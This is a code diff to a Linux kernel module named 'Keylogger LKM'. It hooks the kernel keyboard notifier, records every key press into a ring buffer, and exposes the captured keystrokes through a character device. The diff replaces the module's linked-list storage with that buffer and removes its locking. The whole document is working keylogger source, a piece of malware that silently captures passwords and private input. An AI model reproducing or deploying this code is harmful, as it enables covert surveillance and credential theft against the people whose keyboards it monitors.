@@ -10,14 +10,9 @@
 #define DEVICE_NAME "keylogger"
 #define CLASS_NAME  "keylogger"
 
-MODULE_AUTHOR("Nick Bulischeck and Pedro Freitas");
+MODULE_AUTHOR("Nick Bulischeck");
 MODULE_DESCRIPTION("Keylogger LKM");
 MODULE_LICENSE("GPL");
-
-typedef struct keypress {
-	const char *key;
-	struct list_head list;
-} keypress;
 
 static int key_callback(struct notifier_block *, unsigned long, void *);
 
@@ -25,12 +20,11 @@ static struct notifier_block notifier = {
 	.notifier_call = key_callback,
 };
 
-static LIST_HEAD(key_list);
-static DEFINE_MUTEX(dev_lock);
-static DEFINE_RWLOCK(list_lock);
+#define BUF_LEN 1024
+static size_t buf_pos = 0;
+static char keys_buf[BUF_LEN];
 
 static int major;
-static char *log;
 static struct class  *char_class  = NULL;
 static struct device *char_device = NULL;
 
@@ -70,60 +64,41 @@ static const char *keymap[][2] = {
 	{"_PAUSE_", "_PAUSE_"},
 };
 
-static int fill_log(void){
-	char *ptr = NULL;
-	int offset = 0, length = 0;
-	keypress *entry;
-
-	read_lock(&list_lock);
-	list_for_each_entry(entry, &key_list, list){
-		length = strlen(entry->key);
-
-		ptr = krealloc(log, offset+length+1, GFP_KERNEL);
-		if (IS_ERR(ptr)){
-			kfree(log);
-			return -ENOMEM;
-		}
-		log = ptr;
-
-		memcpy(log+offset, entry->key, length+1);
-		offset += length;
-	}
-	read_unlock(&list_lock);
-
-	return 0;
-}
-
-static void insert(const char *key){
-	keypress *node;
-
-	if (!key)
-		return;
-
-	node = kmalloc(sizeof(*node), GFP_KERNEL);
-	if (IS_ERR(node))
-		return;
-
-	node->key = key;
-
-	write_lock(&list_lock);
-	INIT_LIST_HEAD(&node->list);
-	list_add_tail(&node->list, &key_list);
-	write_unlock(&list_lock);
-}
-
 static const char *decode(int key, int shift){
 	if(key > KEY_RESERVED && key <= KEY_PAUSE)
 		return keymap[key][shift & 1];
 	return NULL;
 }
 
+static int key_callback(struct notifier_block *nb, unsigned long code, void *p){
+	size_t len;
+	const char *keybuf;
+	struct keyboard_notifier_param *param = p;
+
+	if (!(param->down))
+		return NOTIFY_OK;
+
+	keybuf = decode(param->value, param->shift);
+	if (keybuf == NULL)
+		return NOTIFY_OK;
+
+	len = strlen(keybuf);
+
+	if ((buf_pos + len) >= BUF_LEN)
+		buf_pos = 0;
+
+	memcpy(keys_buf + buf_pos, keybuf, len);
+	buf_pos += len;
+
+	return NOTIFY_OK;
+}
+
 static inline int dev_open(struct inode *inodep, struct file *filep){
-	return mutex_lock_interruptible(&dev_lock) ? -EBUSY : fill_log();
+	return 0;
 }
 
 static inline ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset){
-	return simple_read_from_buffer(buffer, len, offset, log, strlen(log));
+	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
 }
 
 static inline ssize_t dev_write(struct file *filep, const char *buffer, size_t len, loff_t *offset){
@@ -131,7 +106,6 @@ static inline ssize_t dev_write(struct file *filep, const char *buffer, size_t l
 }
 
 static inline int dev_release(struct inode *inodep, struct file *filep){
-	mutex_unlock(&dev_lock);
 	return 0;
 }
 
@@ -178,31 +152,13 @@ int init_char_dev(void){
 	return 0;
 }
 
-static int key_callback(struct notifier_block *nb, unsigned long code, void *p){
-	struct keyboard_notifier_param *param = p;
-	if (param->down){
-		insert(decode(param->value, param->shift));
-	}
-	return NOTIFY_OK;
-}
-
 static int __init init_mod(void){
 	register_keyboard_notifier(&notifier);
 	return init_char_dev();
 }
 
 static void __exit exit_mod(void){
-	keypress *ptr, *next;
-
 	unregister_keyboard_notifier(&notifier);
-
-	write_lock(&list_lock);
-	list_for_each_entry_safe(ptr, next, &key_list, list){
-		list_del(&ptr->list);
-		kfree(ptr);
-	}
-	write_unlock(&list_lock);
-
 	exit_char_dev();
 }
 
